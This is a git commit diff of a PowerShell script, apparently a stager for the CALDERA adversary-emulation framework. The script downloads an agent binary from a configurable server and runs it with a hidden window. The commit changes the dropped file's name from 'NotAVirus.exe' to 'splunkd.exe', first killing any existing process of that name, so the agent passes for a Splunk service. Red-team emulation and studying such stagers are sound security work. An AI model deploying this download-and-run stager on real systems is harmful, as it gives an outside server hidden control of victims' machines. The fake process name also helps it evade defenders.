03b2b0009b26a66601b145772dd13bbcafb0b313
Andre Fernandes <andre.fernandes86@gmail.com>
2022-07-18 16:11:19 -0500

    Update caldera.ps1

--- caldera.ps1
+++ caldera.ps1
@@ -1,4 +1,4 @@
-$server="http://0.0.0.0:8888";
+$server="http://CHANGE-ME";
 $url="$server/file/download";
 $wc=New-Object System.Net.WebClient;
 $wc.Headers.add("platform","windows");
@@ -6,5 +6,5 @@ $wc.Headers.add("file","sandcat.go");
 $data=$wc.DownloadData($url);
 get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;
 rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
-[io.file]::WriteAllBytes("C:\Users\Public\NotAVirus.exe",$data) | Out-Null;
-Start-Process -FilePath C:\Users\Public\NotAVirus.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
+Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
